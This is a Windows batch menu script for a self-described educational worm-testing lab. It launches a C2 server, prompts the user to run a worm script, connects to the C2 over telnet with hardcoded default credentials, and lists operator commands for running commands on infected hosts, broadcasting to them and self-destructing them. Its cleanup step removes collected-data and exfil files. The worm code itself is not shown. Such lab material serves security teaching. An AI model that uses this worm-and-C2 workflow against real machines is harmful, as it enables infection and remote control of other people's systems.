@echo off
echo ================================================================
echo EDUCATIONAL CYBERSECURITY LAB - WORM TESTING ENVIRONMENT
echo ================================================================
echo ETHICAL DISCLAIMER: For authorized testing only. Misuse prohibited.
echo.
echo This script helps set up the educational worm testing environment
echo in your controlled lab environment.
echo ================================================================
echo.

:MENU
echo AVAILABLE OPTIONS:
echo.
echo 1. Start C2 Server
echo 2. Run Worm (in separate terminal)
echo 3. Connect to C2 via Telnet
echo 4. View C2 Logs
echo 5. Clean Lab Environment
echo 6. Exit
echo.
set /p choice="Select option (1-6): "

if "%choice%"=="1" goto START_C2
if "%choice%"=="2" goto RUN_WORM
if "%choice%"=="3" goto TELNET_C2
if "%choice%"=="4" goto VIEW_LOGS
if "%choice%"=="5" goto CLEAN_LAB
if "%choice%"=="6" goto EXIT
goto MENU

:START_C2
echo.
echo Starting C2 Server...
echo Default ports: HTTP=8080, Telnet=9999
echo Default telnet credentials: admin/lab123
echo.
python c2_server_educational.py
pause
goto MENU

:RUN_WORM
echo.
echo INSTRUCTIONS FOR RUNNING WORM:
echo.
echo 1. Open a NEW command prompt/terminal
echo 2. Navigate to this directory
echo 3. Run: python worm_analysis_educational.py
echo.
echo IMPORTANT: Make sure C2 server is running first!
echo.
pause
goto MENU

:TELNET_C2
echo.
echo Connecting to C2 Server via Telnet...
echo Default credentials: admin/lab123
echo.
echo Available C2 Commands:
echo   hosts          - List infected hosts
echo   status         - Show server status
echo   cmd ^<id^> ^<cmd^> - Send command to host
echo   kill ^<id^>      - Self-destruct host
echo   help           - Show all commands
echo.
telnet localhost 9999
pause
goto MENU

:VIEW_LOGS
echo.
echo Viewing C2 Server Logs...
echo.
if exist c2_server.log (
    type c2_server.log
) else (
    echo No log file found. Start C2 server first.
)
echo.
pause
goto MENU

:CLEAN_LAB
echo.
echo Cleaning Lab Environment...
echo This will remove all generated files and logs.
echo.
set /p confirm="Are you sure? (y/n): "
if /i "%confirm%"=="y" (
    echo Cleaning files...
    if exist c2_server.log del c2_server.log
    if exist c2_database.db del c2_database.db
    if exist advanced_worm.log del advanced_worm.log
    if exist worm_analysis.log del worm_analysis.log
    if exist worm_analysis_report.json del worm_analysis_report.json
    if exist collected_data_*.json del collected_data_*.json
    if exist exfil_*.json del exfil_*.json
    echo Lab environment cleaned.
) else (
    echo Cleanup cancelled.
)
pause
goto MENU

:EXIT
echo.
echo Exiting lab environment...
echo Remember to properly clean up any running processes.
echo.
pause
exit

echo.
echo ================================================================
echo LAB SETUP COMPLETE
echo ================================================================
echo.
echo USAGE INSTRUCTIONS:
echo.
echo 1. First, start the C2 server (Option 1)
echo 2. Then run the worm in a separate terminal (Option 2)
echo 3. Connect via telnet to control the worm (Option 3)
echo.
echo TELNET COMMANDS:
echo   hosts                    - List all infected hosts
echo   host ^<worm_id^>           - Show host details
echo   cmd ^<worm_id^> ^<command^>  - Execute command on host
echo   broadcast ^<command^>      - Send command to all hosts
echo   kill ^<worm_id^>           - Self-destruct specific host
echo   killall                  - Self-destruct all hosts
echo   stats                    - Show infection statistics
echo   logs                     - View recent activity
echo.
echo SAFETY FEATURES:
echo   - 30-minute self-destruct timer on worms
echo   - Maximum 50 propagation attempts
echo   - Lab environment detection
echo   - Comprehensive cleanup on exit
echo.
echo ================================================================ 